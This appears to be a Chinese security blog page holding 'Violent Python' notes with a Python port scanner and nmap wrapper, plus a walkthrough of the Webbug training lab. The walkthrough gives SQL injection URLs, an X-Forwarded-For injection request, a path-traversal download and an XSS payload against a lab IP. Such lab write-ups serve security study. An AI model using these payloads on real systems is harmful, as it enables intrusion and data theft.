<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>shackle</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="shackle">
<meta property="og:url" content="https://shackles.top/page/4/index.html">
<meta property="og:site_name" content="shackle">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="shackle">
  
    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo1.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/


  </style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/home.css" >
  

  

  

  
  
  

</head>



  <body>


  
    <header id="header">

	<!-- 背景图模式 -->
	

    
      <div id="intrologo" class="intro-logo" style="background-position:center; background-repeat:no-repeat; background-image: url(); background-size: auto 100%;">

      <!-- Support rolling -->  
        
        <section class="awSlider">
          <div class="carousel slide carousel-fade " data-ride="carousel">

            <!-- Wrapper for slides -->
            <div class="carousel-inner">
               
                  
                    <div class="item active">
                  
                    <img id="carousel-img0" src="http://osuq6jhys.bkt.clouddn.com/wqfe.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img0 = new Image();
                      var imageTag0 = document.getElementById("carousel-img0");
                      img0.src = imageTag0.src;
                      img0.onload=function(){
                        if (img0.width / img0.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag0.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag0.style.height = document.body.clientHeight + "px";
                          imageTag0.style.marginLeft = -(document.body.clientHeight * img0.width / img0.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img1" src="https://source.unsplash.com/1920x1080/?nature">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img1 = new Image();
                      var imageTag1 = document.getElementById("carousel-img1");
                      img1.src = imageTag1.src;
                      img1.onload=function(){
                        if (img1.width / img1.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag1.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag1.style.height = document.body.clientHeight + "px";
                          imageTag1.style.marginLeft = -(document.body.clientHeight * img1.width / img1.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img2" src="https://source.unsplash.com/collection/954550/1920x1080">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img2 = new Image();
                      var imageTag2 = document.getElementById("carousel-img2");
                      img2.src = imageTag2.src;
                      img2.onload=function(){
                        if (img2.width / img2.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag2.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag2.style.height = document.body.clientHeight + "px";
                          imageTag2.style.marginLeft = -(document.body.clientHeight * img2.width / img2.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
            </div>

            <!-- Controls -->
            <a class="left carousel-control" href=".carousel" role="button" data-slide="prev">
              <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
              <span class="sr-only">Geri</span>
            </a>
            <a class="right carousel-control" href=".carousel" role="button" data-slide="next">
              <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
              <span class="sr-only">İleri</span>
            </a>
          </div>
        </section>
        <script>
          $('section.awSlider .carousel').carousel({
              pause: '',
              interval: 5000
          });
          var startImage = $('section.awSlider .item.active > img').attr('src');
          $('section.awSlider .carousel').on('slid.bs.carousel', function () {
              var bscn = $(this).find('.item.active > img').attr('src');
              $('section.awSlider > img').attr('src', bscn);
          });
        </script>
      

    
 


    <canvas width="100%" height="100%"></canvas>
    <script>
      var c = document.getElementsByTagName('canvas')[0],
          x = c.getContext('2d'),
          w = window.innerWidth,
          h = window.innerHeight,
          pr = window.devicePixelRatio || 1,
          f = 90,
          q,
          m = Math,
          r = 0,
          u = m.PI*2,
          v = m.cos,
          z = m.random
      c.width = w*pr
      c.height = h*pr
      x.scale(pr, pr)
      x.globalAlpha = 0.6

      <!-- 折线Polyline背景 -->
      
    </script>
    

    
      <div id="homelogo" class="homelogo" style="background: rgba(255,255,255,1);"> 
    

        
          <div class="homelogoback"  style="border: 1px solid #404040;" >
            <h1><a href="#content" id="logo">shackle</a></h1>
            <h3></h3>
            <h5>shackle</h5>
            <!-- <p><a href="https://github.com/iTimeTraveler" target="_blank">Github</a></p> -->
          </div>
        
    
    </div>
  </div>

  <!-- 自适应主页背景大图 -->
  

 <!-- home_logo_image居中 -->
 
    <script>
        var homelogodiv = document.getElementById("homelogo");
        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
          homelogodiv.style.width = document.body.clientWidth + "px";
          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
        } else {
          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
        }
    </script>
  

  <div class="intro-navigate">
      <p class="navigater-list">
        
          <a id="beautifont" class="main-nav-link" href="/">首页</a>
        
          <a id="beautifont" class="main-nav-link" href="/archives">归档</a>
        
          <a id="beautifont" class="main-nav-link" href="/about">关于</a>
        
      </p>
  </div>

</header>
  
  <div id="container">
    <div id="wrap">
      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;">
  
    <article id="post-Violent Python"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/04/07/Violent Python/">Violent Python</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/04/07/Violent Python/" class="article-date">
	  <time datetime="2017-04-07T15:53:56.000Z" itemprop="datePublished">2017-04-07</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Violent-Python"><a href="#Violent-Python" class="headerlink" title="Violent Python"></a>Violent Python</h1><p><a href="http://shackles.top/2017/04/07/violent%20python%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%BA%8C%E7%AB%A0/"> 2017-04-07</a></p>
<h1 id="用pyhon进行渗透测试"><a href="#用pyhon进行渗透测试" class="headerlink" title="用pyhon进行渗透测试"></a>用pyhon进行渗透测试</h1><h2 id="2-1-编写端口扫描"><a href="#2-1-编写端口扫描" class="headerlink" title="2.1 编写端口扫描"></a>2.1 编写端口扫描</h2><h3 id="2-1-1-TCP全连接扫描"><a href="#2-1-1-TCP全连接扫描" class="headerlink" title="2.1.1 TCP全连接扫描"></a>2.1.1 TCP全连接扫描</h3><ol>
<li>TCP 全连接扫描：socket 和 optpares</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socket.gethostbyname(hostname) \\</span><br><span class="line">socket.gethostbyaddr(ip addreess) \\</span><br><span class="line">socket.socket(\[family\[,type\[,proto]]])\\</span><br><span class="line">socket.create_connection(addrees\[,timeout\[,surece_address]])</span><br></pre></td></tr></table></figure>
<ol>
<li>​</li>
</ol>
<p>optparse 模块是python的内建模块应用于处理命令行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from optparse import OptionParser  </span><br><span class="line">[...]  </span><br><span class="line"></span><br><span class="line">parser = OptionParser()  </span><br><span class="line"></span><br><span class="line">parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;,  </span><br><span class="line">                  help=&quot;write report to FILE&quot;, metavar=&quot;FILE&quot;)  </span><br><span class="line">parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;,  </span><br><span class="line">                  action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True,  </span><br><span class="line">                  help=&quot;don&apos;t print status messages to stdout&quot;)  </span><br><span class="line">  </span><br><span class="line">(options, args) = parser.parse_args()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">故命令行可以使用：</span><br><span class="line"></span><br><span class="line">usage: &lt;yourscript&gt; [options]  </span><br><span class="line">  </span><br><span class="line">options:  </span><br><span class="line">  -h, --help            show this help message and exit  </span><br><span class="line">  -f FILE, --file=FILE  write report to FILE  </span><br><span class="line">  -q, --quiet           don&apos;t print status messages to stdout</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2-2-2-抓取应用的Banner"><a href="#2-2-2-抓取应用的Banner" class="headerlink" title="2.2.2 抓取应用的Banner"></a>2.2.2 抓取应用的Banner</h3><h3 id="2-2-3-线程扫描"><a href="#2-2-3-线程扫描" class="headerlink" title="2.2.3 线程扫描"></a>2.2.3 线程扫描</h3><p>python-nmap 利用python 调用nmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TCP SYN 扫描 ：又称为半开放扫描，这种类型的扫描发送一个SYN的TCP连接数包等待响应，当返回RST数据包表示端口关闭，返回ACK数据包表示端口开放。</span><br><span class="line"></span><br><span class="line">TCP NULL 扫描 ：TCP空扫描设置TCP的标志头为零。如果返回一个RST数据包则表示这个端口是关闭的。</span><br><span class="line"></span><br><span class="line">TCP FIN 扫描 : TCP FIN扫描发送一个FIN数据包，主动关闭连接，等待一个圆满的终止，如果返回RST数据包则表示端口是关闭的。</span><br><span class="line"></span><br><span class="line">TCP XMAS 扫描 ：TCP XMAS扫描设置 PSH, FIN,和URG TCP标志位，如返回RST数据包则表示这个端口是关闭的。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># -*- by shackle -*-</span><br><span class="line">#  输入主机名与端口-&gt;主机名变为IPV4地址-&gt;</span><br><span class="line">import optparse</span><br><span class="line">import socket</span><br><span class="line">import  threading</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line"># 建立socket连接</span><br><span class="line">def connScan(tgtHost,tgtPort):</span><br><span class="line">    try:</span><br><span class="line">        connSkt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connSkt.connect((tgtHost,tgtPort))</span><br><span class="line">        print &apos;[+]%d/tcp open&apos;%tgtPort</span><br><span class="line">        connSkt.close()</span><br><span class="line">    except:</span><br><span class="line">        print &apos;[-]%d/tcp closed &apos;% tgtPort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 定义端口扫描函数</span><br><span class="line">def portScan(tgtHost, tgtPorts):</span><br><span class="line">    try:</span><br><span class="line">        tgtIP = socket.gethostbyname(tgtHost)</span><br><span class="line"></span><br><span class="line">    except: </span><br><span class="line">        print &quot;[-] Cannot resolve &apos;%s&apos;: Unknown host&quot; % tgtHost</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        tgtName = socket.gethostbyaddr(tgtIP)</span><br><span class="line">        print &apos;\n[+] Scan Results for: &apos; + tgtName[0]</span><br><span class="line">    except:</span><br><span class="line">        print &apos;\n[+] Scan Results for: &apos; + tgtIP</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    ### 多线程，多端口</span><br><span class="line">    for tgtPort in tgtPorts:</span><br><span class="line">        print(&apos;Scanning port &apos; + str(tgtPort))</span><br><span class="line">        t = threading.Thread(target=connScan, args=(tgtHost, int(tgtPort)))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(&apos;use:  –H &lt;target host&gt; -P &lt;target port&gt;&apos;)  # 新建paser对象</span><br><span class="line">    parser.add_option(&apos;-H&apos;, &apos;--host&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;taget host&apos;)</span><br><span class="line">    parser.add_option(&apos;-P&apos;, &apos;--port&apos;, dest=&apos;tgtPort&apos;, type=&apos;int&apos;, help=&apos;taget port&apos;)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    # 已经定义好了所有的命令行参数，调用 parse_args() 来解析程序的命令行：</span><br><span class="line">    # options，它是一个对象（optpars.Values），保存有命令行参数值。只要知道命令行参数名，如 file，就可以访问其对应的值： options.file 。</span><br><span class="line">    # args，它是一个由 positional arguments 组成的列表。</span><br><span class="line"></span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    tgtPort = options.tgtPort</span><br><span class="line">    args.append(tgtPort)  # 设置端口列表</span><br><span class="line">    if (tgtHost == None) | (tgtPort == None):</span><br><span class="line">        print parser.usage</span><br><span class="line">        exit(0)</span><br><span class="line">    portScan(tgtHost,args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="2-2-4-利用NMAP"><a href="#2-2-4-利用NMAP" class="headerlink" title="2.2.4 利用NMAP"></a>2.2.4 利用NMAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># -*- by shackle -*-\</span><br><span class="line">#  调用 nmap</span><br><span class="line"></span><br><span class="line">import optparse</span><br><span class="line">import nmap</span><br><span class="line"></span><br><span class="line">def nmapScan(tgtHost, tgtPort):</span><br><span class="line">    nmScan = nmap.PortScanner()</span><br><span class="line">    results = nmScan.scan(tgtHost, tgtPort)</span><br><span class="line">    state = results[&apos;scan&apos;][tgtHost][&apos;tcp&apos;][int(tgtPort)][&apos;state&apos;]</span><br><span class="line">    print(&quot; [*] &quot; + tgtHost + &quot; tcp/&quot; + tgtPort + &quot; &quot; + state)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(&apos;usage %prog –H &lt;target host&gt; -P &lt;target port&gt;&apos;)</span><br><span class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)</span><br><span class="line">    parser.add_option(&apos;-P&apos;, dest=&apos;tgtPort&apos;, type=&apos;string&apos;, help=&apos;specify target port&apos;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    tgtPort = options.tgtPort</span><br><span class="line">    args.append(tgtPort)    </span><br><span class="line">    if (tgtHost == None) | (tgtPort == None):</span><br><span class="line">        print(&apos;[-] You must specify a target host and port[s]!&apos;)</span><br><span class="line">        exit(0)</span><br><span class="line">    for tgport in args:</span><br><span class="line">        nmapScan(tgtHost, tgport)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-webbug"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/04/05/webbug/">国产Webbug开源漏洞平台</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/04/05/webbug/" class="article-date">
	  <time datetime="2017-04-05T15:53:56.000Z" itemprop="datePublished">2017-04-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>国产的Webbug开源漏洞平台搞一下~</p>
<p>get注入<br>图片破解<br>信息收集练习——目录端口收集<br>暴力破解练习<br>x-forwarded-for注入<br>支付漏洞<br>垂直越权<br>CSRF<br>url跳转<br>GET任意文件下载<br>POST任意文件下载<br>无验证上传<br>反射型XSS<br>存储型XSS<br>校验扩展名上传<br>验证来源去向的url跳转<br>文件包含<br>POST文件包含<br>HOST注入<br>APK破解<br>延时注入<br>DZ7.2论坛sql注入<br>aspcms注入<br>phpmyadmin任意文件包含漏洞<br>齐博系统SQL注入<br>海盗云商getshell<br>PHP168任意代码执行GET SHELL<br>ecshop 注入<br>ShopXp系统SQL注射漏洞<br>Dcore(轻型CMS系统)注入漏洞<br>MetInfo 任意文件包含漏洞可getshell<br>Metinfo news.php盲注<br>Metinfo img.php盲注<br>万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入<br>BEESCMS sql注入，无视防御<br>ourphp 注入<br>phpwind 命令执行漏洞<br>metinfo 任意用户密码修改<br>DZ 3.2 存储型XSS<br>DedeCMS flink.php友情链接注入<br>DedeCms?recommend.php注入<br>BEESCMS 小于等于V4四处注入+无需密码直接进后台<br>海洋 x-forwarded-for注入<br>php截断利用<br>st2-016<br>jboss命令执行<br>tomcat弱口令<br>hfs远程命令执行<br>st2-052命令执行<br>flash远程命令执行<br>gh0st远程溢出<br>IIS6.0远程溢出</p>
<h2 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h2><h3 id="第一关-get注入-很简单的一个注入"><a href="#第一关-get注入-很简单的一个注入" class="headerlink" title="第一关:get注入__很简单的一个注入"></a>第一关:get注入__很简单的一个注入</h3><p>GET 手工注入/sqlmap</p>
<p>1、爆列长     order by 4  为<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23</span><br></pre></td></tr></table></figure></p>
<p>回显：不爆错，所以列长是4。</p>
<p>2、爆表  mysql information_schema  元信息表</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database() %23</span><br></pre></td></tr></table></figure>
<p>回显：comment,flag,goods,user  四个表</p>
<p>3、爆列</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(column_name),2,3,4 from information_schema.columns where table_name = 'flag' %23</span><br></pre></td></tr></table></figure>
<p>回显：id,flag   flag表中的列</p>
<p>4、查询flag值</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select 1,flag,3,4 from flag %23</span><br></pre></td></tr></table></figure>
<p>回显：名称为:204f704fbbcf6acf398ffee11989b377</p>
<h3 id="第二关-从图片中你能找到什么？"><a href="#第二关-从图片中你能找到什么？" class="headerlink" title="第二关:从图片中你能找到什么？"></a>第二关:从图片中你能找到什么？</h3><p>图片隐写题目 ，  想想之前misc 题目做的想吐。</p>
<h3 id="第三关-你看到了什么？"><a href="#第三关-你看到了什么？" class="headerlink" title="第三关:你看到了什么？"></a>第三关:你看到了什么？</h3><p>扫目录。。。emmm</p>
<h3 id="第四关-告诉你了flang是5位数"><a href="#第四关-告诉你了flang是5位数" class="headerlink" title="第四关:告诉你了flang是5位数"></a>第四关:告诉你了flang是5位数</h3><p><a href="http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html</a></p>
<p>bp  抓包爆破弱口令。 admin   admin 123</p>
<h3 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h3><p>XFF 头注入</p>
<p>浅谈http头注入(附案例)<br><a href="https://zhuanlan.zhihu.com/p/27553821" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27553821</a></p>
<p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>
<p>Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）.</p>
<p>X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）.</p>
<p>Clien-IP：同上，不做过多介绍.</p>
<p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过    来的.</p>
<p>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /pentest/test/1/ HTTP/1.1</span><br><span class="line">Host: 10.102.15.214</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: HFS_SID_=0.630969217978418</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Forwarded-For:union select 1,flag,3,4 from flag</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
<h3 id="第六关-这关需要rmb购买哦"><a href="#第六关-这关需要rmb购买哦" class="headerlink" title="第六关:这关需要rmb购买哦"></a>第六关:这关需要rmb购买哦</h3><p>截获数据包进行修改数量  逻辑漏洞</p>
<h3 id="第七关-越权"><a href="#第七关-越权" class="headerlink" title="第七关:越权"></a>第七关:越权</h3><p>越权修改密码</p>
<p><a href="http://10.102.15.214/pentest/test/3/change.php?name=admin" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/3/change.php?name=admin</a></p>
<h3 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h3><p>将更改密码的请求用Burpsuite截获 可一键生成CSRF PoC</p>
<h3 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h3><p><a href="http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com</a></p>
<h3 id="第十关-文件下载"><a href="#第十关-文件下载" class="headerlink" title="第十关:文件下载"></a>第十关:文件下载</h3><p><a href="http://10.102.15.214/pentest/test/6/1/download.php" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/6/1/download.php</a></p>
<p>任意文件下载  payload：  下载  config.php</p>
<p><a href="http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php</a></p>
<h3 id="第十一关-我和上一题有点像"><a href="#第十一关-我和上一题有点像" class="headerlink" title="第十一关:我和上一题有点像"></a>第十一关:我和上一题有点像</h3><p>的确和上一关有点像 也是要找回mysql账号密码 还是先把下载的包抓下来看看 上一关的下载用的是get 本关用的post</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\img1522055666619.png?lastModify=1522056169" alt="img"><br><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056171589.png" alt="52205617158"></p>
<h3 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关:我系统密码忘记了！"></a>第十二关:我系统密码忘记了！</h3><p>​    上传漏洞的连接菜刀。</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056297807.png" alt="52205629780"></p>
<h3 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关:XSS"></a>第十三关:XSS</h3><p>反射型 xss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/9/?id=&lt;img src onerror=al ert()&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056415953.png" alt="52205641595"></p>
<h3 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关:存储型XSS"></a>第十四关:存储型XSS</h3><p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056469320.png" alt="52205646932"></p>
<h3 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关:什么？图片上传不了？"></a>第十五关:什么？图片上传不了？</h3><p>只验证了Content-Type </p>
<p>抓包改。。。</p>
<h3 id="第十六关-明天双十一"><a href="#第十六关-明天双十一" class="headerlink" title="第十六关:明天双十一"></a>第十六关:明天双十一</h3><h2 id="中级进阶"><a href="#中级进阶" class="headerlink" title="中级进阶"></a>中级进阶</h2><h3 id="第一关-出来点东西吧-任意文件读取"><a href="#第一关-出来点东西吧-任意文件读取" class="headerlink" title="第一关:出来点东西吧  任意文件读取"></a>第一关:出来点东西吧  任意文件读取</h3><p>get 方式文件包含漏洞</p>
